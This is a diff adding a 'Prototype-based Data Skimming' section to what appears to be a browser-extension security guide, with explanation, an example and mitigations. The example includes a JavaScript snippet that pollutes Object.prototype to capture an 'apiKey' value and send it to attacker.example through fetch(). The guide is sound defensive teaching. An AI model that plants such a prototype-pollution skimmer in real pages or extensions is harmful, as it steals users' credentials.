@@ -1112,6 +1112,48 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#12-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      12. Prototype-based Data Skimming
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="12. Prototype-based Data Skimming">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability: Prototype-based Data Skimming
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example: Prototype-based Data Skimming
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation: Prototype-based Data Skimming
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#conclusion" class="md-nav__link">
     <span class="md-ellipsis">
       Conclusion
@@ -3515,6 +3557,48 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#12-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      12. Prototype-based Data Skimming
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="12. Prototype-based Data Skimming">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability: Prototype-based Data Skimming
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example: Prototype-based Data Skimming
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation-prototype-based-data-skimming" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation: Prototype-based Data Skimming
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#conclusion" class="md-nav__link">
     <span class="md-ellipsis">
       Conclusion
@@ -3690,6 +3774,38 @@ Never hardcode API keys or credentials within the extension code.</p>
 </ul>
 <p>It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot"><code>openOrClosedShadowRoot()</code> API</a>.</p>
 <p>Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.</p>
+<h2 id="12-prototype-based-data-skimming">12. Prototype-based Data Skimming<a class="headerlink" href="#12-prototype-based-data-skimming" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-prototype-based-data-skimming">Vulnerability: Prototype-based Data Skimming<a class="headerlink" href="#vulnerability-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
+<p>An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a <code>&lt;script&gt;</code> tag directly to DOM with <code>src</code> attribute pointing to a script of <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources">web accessible resources</a>.</p>
+<p>When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.</p>
+<p>The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.</p>
+<p>This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.</p>
+<h3 id="example-prototype-based-data-skimming">Example: Prototype-based Data Skimming<a class="headerlink" href="#example-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// Malicious script overwriting all objects&#39; setter for &#39;apiKey&#39;</span>
+<span class="c1">// to send the value to be set towards a server.</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;apiKey&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`https://attacker.example?data=</span><span class="si">${</span><span class="nx">str</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+<span class="w">        </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;apiKey&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span>
+<span class="w">        </span><span class="p">})</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">str</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">})</span>
+
+<span class="c1">// Extension&#39;s script to be executed on a web page&#39;s context.</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">apiKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// the setter for &#39;apiKey&#39; is already polluted,</span>
+<span class="w">    </span><span class="c1">// and the below line triggers malicious code and the data is immediately sent.</span>
+<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">apiController</span><span class="p">.</span><span class="nx">apiKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">apiKey</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div>
+<h3 id="mitigation-prototype-based-data-skimming">Mitigation: Prototype-based Data Skimming<a class="headerlink" href="#mitigation-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
+<p>Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use <code>window.postMessage</code>, because it can be overwritten also and malicious scripts can add listeners for <code>message</code> event.</p>
+<p>Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.</p>
+<p>Also, please don't assume your extension's script can use native prototypes even if it's executed at <code>document_start</code> timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at <code>document_start</code> (<a href="https://issues.chromium.org/issues/40202434">official bug issue</a>).</p>
 <h2 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h2>
 <p>By following these security best practices, developers can build safer browser extensions and protect users from privacy and security threats. Always prioritize least privilege, encryption, and secure coding principles when developing extensions.</p>
 <p>🔹 References:
